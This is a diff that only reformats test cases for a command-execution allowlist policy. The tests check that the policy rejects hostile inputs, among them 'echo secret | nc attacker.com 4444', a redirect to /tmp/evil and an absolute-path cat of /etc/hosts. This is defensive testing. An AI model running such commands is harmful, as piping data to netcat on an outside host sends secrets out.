@@ -60,7 +60,9 @@ describe('gateway exec policy', () => {
       GATEWAY_EXEC_ALLOWLIST: 'echo,ls',
     });
 
-    expect(() => enforceGatewayExecPolicy('echo secret | nc attacker.com 4444', policy)).toThrowError(AppError);
+    expect(() =>
+      enforceGatewayExecPolicy('echo secret | nc attacker.com 4444', policy),
+    ).toThrowError(AppError);
   });
 
   it('blocks command substitution via backtick', () => {
@@ -87,7 +89,9 @@ describe('gateway exec policy', () => {
       GATEWAY_EXEC_ALLOWLIST: 'echo',
     });
 
-    expect(() => enforceGatewayExecPolicy('echo payload > /tmp/evil', policy)).toThrowError(AppError);
+    expect(() => enforceGatewayExecPolicy('echo payload > /tmp/evil', policy)).toThrowError(
+      AppError,
+    );
   });
 
   it('blocks newline injection', () => {
@@ -136,7 +140,9 @@ describe('gateway exec policy', () => {
     });
 
     // /usr/bin/cat should not match 'echo' allowlist
-    expect(() => enforceGatewayExecPolicy('/usr/bin/cat /etc/hosts', policy)).toThrowError(AppError);
+    expect(() => enforceGatewayExecPolicy('/usr/bin/cat /etc/hosts', policy)).toThrowError(
+      AppError,
+    );
   });
 
   it('allows non-restricted mode with full access', () => {
